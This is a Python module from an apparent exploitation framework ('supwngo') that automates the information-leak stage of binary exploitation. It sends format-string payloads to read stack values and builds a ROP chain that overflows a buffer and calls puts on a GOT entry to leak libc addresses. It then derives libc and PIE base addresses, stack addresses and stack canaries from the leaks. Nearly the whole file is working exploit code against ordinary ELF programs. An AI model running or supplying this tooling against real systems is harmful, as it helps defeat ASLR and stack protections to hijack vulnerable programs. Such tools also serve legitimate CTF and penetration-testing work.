"""
Automated information leaking strategies.
"""

from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Tuple

from supwngo.core.binary import Binary
from supwngo.core.context import ExploitContext
from supwngo.utils.helpers import p64, u64, p32, u32
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class LeakResult:
    """Result of a leak operation."""
    address: int = 0
    symbol: str = ""
    leak_type: str = ""  # libc, binary, stack, heap
    raw_data: bytes = b""
    success: bool = False


class LeakFinder:
    """
    Automated information leaking strategies.

    Supports:
    - Format string leaks
    - puts/printf GOT leaks
    - Stack leak parsing
    - Heap address leaks
    """

    def __init__(self, context: ExploitContext):
        """
        Initialize leak finder.

        Args:
            context: Exploitation context
        """
        self.context = context
        self.binary = context.binary
        self.bits = context.bits
        self.pack = p64 if self.bits == 64 else p32
        self.unpack = u64 if self.bits == 64 else u32

        self._leaks: Dict[str, int] = {}

    def leak_with_format_string(
        self,
        send_func: Callable[[bytes], None],
        recv_func: Callable[[], bytes],
        prefix: bytes = b"",
        suffix: bytes = b"\n",
        max_offset: int = 50,
    ) -> Dict[str, int]:
        """
        Leak addresses using format string.

        Args:
            send_func: Function to send payload
            recv_func: Function to receive output
            prefix: Bytes before format string
            suffix: Bytes after format string
            max_offset: Maximum offset to try

        Returns:
            Dictionary of leaked addresses
        """
        leaks = {}

        # Leak multiple stack values
        for offset in range(1, max_offset):
            payload = prefix + f"%{offset}$p".encode() + suffix

            try:
                send_func(payload)
                response = recv_func()

                # Parse hex value
                for part in response.split():
                    if part.startswith(b"0x") or part.startswith(b"0X"):
                        try:
                            addr = int(part, 16)
                            if addr > 0x1000:  # Filter small values
                                leaks[f"stack_{offset}"] = addr
                        except ValueError:
                            continue

            except Exception as e:
                logger.debug(f"Leak at offset {offset} failed: {e}")

        self._leaks.update(leaks)
        return leaks

    def leak_with_puts(
        self,
        send_func: Callable[[bytes], None],
        recv_func: Callable[[], bytes],
        got_entry: int,
        overflow_offset: int,
        return_addr: int,
    ) -> Optional[int]:
        """
        Leak address using puts.

        Args:
            send_func: Function to send payload
            recv_func: Function to receive output
            got_entry: GOT entry to leak
            overflow_offset: Offset to return address
            return_addr: Address to return to after leak

        Returns:
            Leaked address or None
        """
        if not self.binary:
            return None

        # Build ROP chain for puts
        try:
            from pwn import ROP

            rop = ROP(self.binary._elf)

            # Find pop rdi gadget
            pop_rdi = rop.find_gadget(["pop rdi", "ret"])
            if not pop_rdi:
                logger.warning("No pop rdi gadget found")
                return None

            # Build payload
            payload = b"A" * overflow_offset

            if self.bits == 64:
                # Stack alignment
                ret = rop.find_gadget(["ret"])
                if ret:
                    payload += self.pack(ret[0])

                payload += self.pack(pop_rdi[0])
                payload += self.pack(got_entry)
                payload += self.pack(self.binary.plt["puts"])
                payload += self.pack(return_addr)
            else:
                payload += self.pack(self.binary.plt["puts"])
                payload += self.pack(return_addr)
                payload += self.pack(got_entry)

            send_func(payload)
            response = recv_func()

            # Parse leaked address
            leaked = response.strip()
            if len(leaked) >= 4:
                if self.bits == 64:
                    addr = u64(leaked[:8].ljust(8, b"\x00"))
                else:
                    addr = u32(leaked[:4].ljust(4, b"\x00"))

                logger.info(f"Leaked address: 0x{addr:x}")
                return addr

        except Exception as e:
            logger.error(f"puts leak failed: {e}")

        return None

    def identify_leak_type(
        self,
        address: int,
    ) -> str:
        """
        Identify what type of address was leaked.

        Args:
            address: Leaked address

        Returns:
            Type string (libc, binary, stack, heap)
        """
        if self.bits == 64:
            # Common address ranges for 64-bit
            if 0x7f0000000000 <= address <= 0x7fffffffffff:
                # Could be stack or libc
                if address > 0x7ff000000000:
                    return "stack"
                return "libc"
            elif 0x400000 <= address <= 0x500000:
                return "binary"  # PIE disabled
            elif 0x550000000000 <= address <= 0x560000000000:
                return "binary"  # PIE enabled
            elif address < 0x100000000:
                return "heap"
        else:
            # 32-bit ranges
            if 0xf7000000 <= address <= 0xf8000000:
                return "libc"
            elif 0x08000000 <= address <= 0x09000000:
                return "binary"
            elif 0xbf000000 <= address <= 0xc0000000:
                return "stack"

        return "unknown"

    def find_libc_base(
        self,
        leaks: Dict[str, int],
    ) -> Optional[int]:
        """
        Find libc base from leaks.

        Args:
            leaks: Dictionary of leaked addresses

        Returns:
            Libc base or None
        """
        for name, addr in leaks.items():
            leak_type = self.identify_leak_type(addr)

            if leak_type == "libc":
                # Check if we have libc info
                if self.context.libc.path:
                    try:
                        from pwn import ELF

                        libc = ELF(str(self.context.libc.path))

                        # Try common symbols
                        for symbol in ["puts", "printf", "__libc_start_main"]:
                            if symbol in libc.symbols:
                                offset = libc.symbols[symbol]
                                # Check if this leak matches
                                if (addr & 0xFFF) == (offset & 0xFFF):
                                    base = addr - offset
                                    if base & 0xFFF == 0:  # Page aligned
                                        logger.info(f"Found libc base: 0x{base:x}")
                                        return base
                    except Exception:
                        pass

        return None

    def find_binary_base(
        self,
        leaks: Dict[str, int],
    ) -> Optional[int]:
        """
        Find binary base from leaks (PIE).

        Args:
            leaks: Dictionary of leaked addresses

        Returns:
            Binary base or None
        """
        if not self.context.protections.pie:
            return self.binary.base_address if self.binary else None

        for name, addr in leaks.items():
            leak_type = self.identify_leak_type(addr)

            if leak_type == "binary":
                # Align to page boundary
                base = addr & ~0xFFF

                # Verify it looks like ELF base
                if self.binary:
                    entry_offset = self.binary.entry_point - self.binary.base_address
                    if (addr & 0xFFF) == (entry_offset & 0xFFF):
                        base = addr - entry_offset
                        logger.info(f"Found binary base: 0x{base:x}")
                        return base

        return None

    def find_stack_address(
        self,
        leaks: Dict[str, int],
    ) -> Optional[int]:
        """
        Find stack address from leaks.

        Args:
            leaks: Dictionary of leaked addresses

        Returns:
            Stack address or None
        """
        for name, addr in leaks.items():
            leak_type = self.identify_leak_type(addr)

            if leak_type == "stack":
                logger.info(f"Found stack address: 0x{addr:x}")
                return addr

        return None

    def find_canary(
        self,
        leaks: Dict[str, int],
    ) -> Optional[int]:
        """
        Find stack canary from leaks.

        Args:
            leaks: Dictionary of leaked addresses

        Returns:
            Canary value or None
        """
        for name, addr in leaks.items():
            # Canary typically starts with null byte
            if self.bits == 64:
                if addr & 0xFF == 0 and addr > 0:
                    # Verify it's not just a null-containing address
                    if self.identify_leak_type(addr) == "unknown":
                        logger.info(f"Possible canary: 0x{addr:x}")
                        return addr
            else:
                if addr & 0xFF == 0 and addr > 0:
                    logger.info(f"Possible canary: 0x{addr:x}")
                    return addr

        return None

    def parse_leak_output(
        self,
        output: bytes,
    ) -> List[int]:
        """
        Parse output for leaked addresses.

        Args:
            output: Raw output bytes

        Returns:
            List of parsed addresses
        """
        addresses = []

        # Try different parsing methods

        # Method 1: Hex strings (0x...)
        import re
        hex_pattern = rb"0x[0-9a-fA-F]+"
        for match in re.finditer(hex_pattern, output):
            try:
                addr = int(match.group(), 16)
                if addr > 0x1000:
                    addresses.append(addr)
            except ValueError:
                continue

        # Method 2: Raw bytes (for puts leak)
        if len(output) >= 4:
            try:
                if self.bits == 64:
                    addr = u64(output[:8].ljust(8, b"\x00"))
                else:
                    addr = u32(output[:4].ljust(4, b"\x00"))

                if 0x1000 < addr < 0x800000000000:
                    addresses.append(addr)
            except Exception:
                pass

        return addresses

    def record_leak(
        self,
        name: str,
        address: int,
    ) -> None:
        """
        Record a leak.

        Args:
            name: Leak identifier
            address: Leaked address
        """
        self._leaks[name] = address
        self.context.add_leak(name, address)

    def get_leaks(self) -> Dict[str, int]:
        """Get all recorded leaks."""
        return self._leaks

    def summary(self) -> str:
        """Get leak finder summary."""
        lines = [
            "Leak Finder Summary",
            "=" * 40,
            f"Leaks found: {len(self._leaks)}",
        ]

        for name, addr in self._leaks.items():
            leak_type = self.identify_leak_type(addr)
            lines.append(f"  {name}: 0x{addr:x} ({leak_type})")

        return "\n".join(lines)
